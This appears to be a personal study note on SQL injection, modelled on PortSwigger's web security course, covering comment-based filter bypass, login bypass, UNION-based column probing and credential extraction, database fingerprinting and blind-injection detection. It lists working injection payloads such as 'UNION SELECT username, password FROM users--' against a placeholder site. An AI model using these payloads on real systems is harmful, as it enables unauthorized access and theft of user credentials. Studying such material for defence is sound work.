#server-side

- interfering with the queries that an application makes to its database
- usually to view data normally not visible
- data can be viewed, sometimes even modified or deleted

#### __Common SQL injection examples:__

1. __Retrieving hidden data__
- modify an SQL to return additional results
- eg:
	- website: `https://insecure-website.com/products?category=Gifts`
	- SQL command `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` to retrieve:
		- all details `*` from the `products` table where the category is `Gifts` and released is `1`
	- add double-dash sequence: `https://insecure-website.com/products?category=Gifts'--`
		- double-dash sequence == comment => it removes `released` category 
	- `https://insecure-website.com/products?category=Gifts'+OR+1=1--`
		- `'` ends `Gifts` string 
		- `+OR+1=1--` is all time true and rest of the command is comment

2. __Subverting application logic__
- change an query to intefere with the application logic
- eg:
	- `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
	- changing the `username` and adding `'--` will bypass password verification

3. __UNION attack__
- retrieve data from different database table
- `UNION` keyword 
	- let's you execute additional `SELECT` query
	- appends the results to the original query
- for UNION attack to work 2 requirements must be met:
	- individual queries must return the same number of columns
	- data type in each column must be compatible between the individual queries
	- => _How many columns are being return from the original query?_
	- => _Which columns returned from the original query are suitable to hold the data types from injected query?_
- __determining the number of columns__
	1. series of `ORDER BY`
		- start with `' ORDER BY 1--` and increase the column index until error occures
	2. series of `UNION SELECT`
		- start with `' UNION SELECT NULL--` and keep adding `NULL`s until NOT error 
- __finding columns with a usefull data type__
	- with determined the number of columns, find out which columns has what data type
	-  `' UNION SELECT 'a',NULL,NULL,NULL--`
	-  `' UNION SELECT NULL,'a',NULL,NULL--`
	-  `' UNION SELECT NULL,NULL,'a',NULL--`
	-  `' UNION SELECT NULL,NULL,NULL,'a'--`
-  __using SQLi UNION attack to retrieve interesting data__
	-  after knowing the number of columns and their data type you can start retrieving
	-  eg. `' UNION SELECT username, password FROM users--`
-  __retrieving multiple values within a single column__
	-  with previous example you only get one line, if you want more:
	-  `' UNION SELECT username || '~' || password FROM users--`
	-  double pipe `||` is string concatenation (Oracle)
	-  separated by `'~'` - it's separator
	-  => ...;administrator~s3cure; wiener~peter;...

4. __Examining the database__
- extracting information about the version and structure of the database
- __database type and version__

Database type | Query 
------- | ------
Microsoft, MySQL | `SELECT @@version`
Oracle | `SELECT * FROM v$version`
PostgreSQL | `SELECT version()`

- __constents of database__
	- most DB types (except Oracle) have a information schema providing info about the DB
	- `SELECT * FROM information_schema.tables`
	- equivalent for Oracle: `SELECT * FROM all_tables`


5. __Blind SQL injection__
- query that is controlled is not returned in the application response
- the application does not return the results of the SQL query or the details of any DB errors within its response
- more complicated

#### __How to detect possible SQL injection?__
- submitting a single quote `'` and looking for errors or other abnormalities
- submitting some SQL specific syntax evaluating the original value of the entry point
- submitting a boolean value - `1=1` or `2=2` and looking for differences in response
- submitting payloads designed to triger time delays when executed within SQL query and looking for differences in the the time taken to respond
- submitting an QAT payloads

#### __SQLi in different parts of the query:
- `UPDATE` within updated values of `WHERE`
- `INSERT` within the inserted values
- `SELECT` within the table or column name
- `SELECT` within the `ORDER BY`

#### __stored SQLi__ 
- usually done by placing the input into a DB


### [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)